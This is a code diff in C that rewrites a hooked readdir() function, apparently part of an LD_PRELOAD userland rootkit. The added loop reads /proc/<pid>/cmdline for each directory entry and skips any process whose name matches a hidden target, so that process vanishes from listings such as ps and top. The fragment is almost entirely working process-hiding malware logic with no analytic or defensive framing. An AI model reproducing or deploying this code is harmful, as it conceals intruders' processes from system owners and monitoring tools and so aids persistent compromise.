@@ -21,8 +21,8 @@ struct dirent *readdir (DIR * dirp){
       fprintf(stderr, "Catched\n");
    }
 
-   struct dirent* ret = orig_readdir(dirp);
-
+   //struct dirent* ret = orig_readdir(dirp);
+   /*
    while (ret != NULL){
       char tmp[256];
       snprintf(tmp,sizeof(tmp),"/proc/%s/cmdline", ret->d_name);
@@ -41,7 +41,29 @@ struct dirent *readdir (DIR * dirp){
       //fclose(f);
       //(strcmp(buffer, hidde_name) == 0)
       ret = orig_readdir (dirp);
-   }
+   }*/
+   struct dirent *ret;
+   do{
+     ret = orig_readdir (dirp);
+     if (ret != NULL){
+      char tmp[256];
+      snprintf(tmp,sizeof(tmp),"/proc/%s/cmdline", ret->d_name);
+      FILE* f = fopen(tmp,"r");
+      char proc_name[100];
+      if(f != NULL){
+         fgets(proc_name, 100, f);
+         //printf("%s\n", proc_name);
+         fclose(f);
+         if (strcmp(proc_name, hidde_name)==0){
+            //ret = orig_readdir (dirp);
+            continue;
+         }
+
+      }
+     }
+     break;
+   }while(ret!=NULL);
+
    return ret;
 
 }
